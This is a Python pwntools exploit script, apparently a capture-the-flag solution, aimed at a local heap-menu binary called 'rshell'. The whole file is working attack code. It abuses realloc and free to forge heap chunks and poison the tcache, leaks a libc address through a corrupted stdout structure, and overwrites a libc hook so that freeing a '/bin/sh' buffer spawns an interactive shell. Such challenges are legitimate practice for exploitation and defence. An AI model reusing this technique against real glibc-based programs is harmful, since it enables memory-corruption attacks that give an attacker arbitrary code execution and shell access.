#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./rshell")

def malloc(index, size, data):
    shell.sendlineafter(b"$ ", f"add {str(index)}".encode())
    shell.sendlineafter(b": ", str(size).encode())
    shell.sendlineafter(b": ", data)

def realloc(index, size, data=b""):
    shell.sendlineafter(b"$ ", f"edit {str(index)}".encode())
    shell.sendlineafter(b": ", str(size).encode())

    if size != 0:
        shell.sendafter(b": ", data)

def free(index):
    shell.sendlineafter(b"$ ", f"rm {str(index)}".encode())

malloc(0, 0x60, p64(0x71).rjust(0x40, b"\x00"))
malloc(1, 0x60, b"A" * 8)
free(0)

realloc(1, 0, b"")
realloc(1, 0x60, b"\xa0")

malloc(0, 0x60, b"A" * 8)
realloc(0, 0x30, b"B" * 8)
free(0)

malloc(0, 0x50, b"A" * 8)

for i in range(7):
    realloc(0, 0x20, b"B" * 8)
    realloc(0, 0x70, b"C" * 8)

realloc(0, 0x70, b"D" * 8)
free(0)

malloc(0, 0x60, p64(0x421).rjust(0x30, b"\x00"))
free(0)

malloc(0, 0x70, p64(0x21).rjust(0x50, b"\x00") + p64(0x21).rjust(0x20, b"\x00"))
free(0)

free(1)

malloc(0, 0x60, b"A" * 8)
realloc(0, 0x60, p64(0x81).rjust(0x30, b"\x00") + b"\x60\x47")

free(0)
malloc(0, 0x30, b"A" * 8)

malloc(1, 0x30, p64(0xfbad1800).ljust(0x1f, b"\x00"))

shell.recv(8)
libc_base = u64(shell.recv(8)) - 0x1e7570

free(0)
malloc(0, 0x60, p64(0x41).rjust(0x30, b"\x00") + p64(libc_base + 0x1e75a0))
free(0)

malloc(0, 0x70, b"A" * 8)
free(0)

malloc(0, 0x70, b"/bin/sh\x00" + p64(libc_base + 0x52fd0))
free(0)

shell.interactive()
